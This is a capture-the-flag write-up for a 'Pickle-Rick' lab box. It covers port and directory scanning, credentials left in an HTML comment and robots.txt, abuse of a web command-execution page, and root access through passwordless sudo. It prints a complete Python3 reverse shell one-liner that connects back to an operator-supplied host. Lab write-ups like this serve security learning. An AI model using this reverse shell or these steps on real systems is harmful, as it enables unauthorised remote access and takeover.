# Pickle-Rick

_13th September 2020_

## Host enumeration

The initial scan reports the following.

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

### Analysis

Since HTTP is running on port 80, we can proceed to view the web page on `http://<IP>/`.
The page source contains a comment with the following. We continue to look for more clues.

```html
<!--

    Note to self, remember username!

    Username: R1ckRul3s

-->
```

## Web enumeration

A `gobuster` scan reveals the following.

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.220.205
[+] Threads:        30
[+] Wordlist:       ../../Wordlists/directory-list-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,html,txt
[+] Timeout:        10s
===============================================================
2020/09/13 14:11:12 Starting gobuster
===============================================================
/index.html (Status: 200)
/login.php (Status: 200)
/assets (Status: 301)
/portal.php (Status: 302)
/robots.txt (Status: 200)
Progress: 7526 / 220560 (3.41%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/09/13 14:14:23 Finished
===============================================================
```

### Analysis

`robots.txt` contains a string : `Wubbalubbadubdub`.
`/assets` contains a few images and gifs.
`/login.php` contains a login page. Logging in with the previously obtained credentials ie., R1ckRul3s:Wubbalubbadubdub, gives us a page with command execution capabilities. The `ls` command shows us multiple files but the command execution page does not let us use commands like cat, head, tail, etc. to view the files. The `less` command seems to work and on opening the file `Sup3rS3cretPickl3Ingred.txt`, we get the first key.

## Reverse shell

Python3 seems to be available on the server, so we can try to upload a reverse shell payload in Python3.

```sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Analysis

A shell is obtained. We can open the files without any restriction now. The `clue.txt` file contains a clue asking us to look around in the file system.

```
Look around the file system for the other ingredient.
```

By intuition, we can move to the `/home` directory. It contains a subdirectory called `rick` which contains a file called `second ingredients`. Upon opening this file, we get the second key.

## Privilege escalation

Looking at the permissions of the current user, we find that (www-data) can execute all commands without a password. So we run `sudo bash` to get a shell as the (root) user.

### Analysis

Moving to the `/root` directory as the (root) user, we find a file called `3rd.txt` which contains the final key.
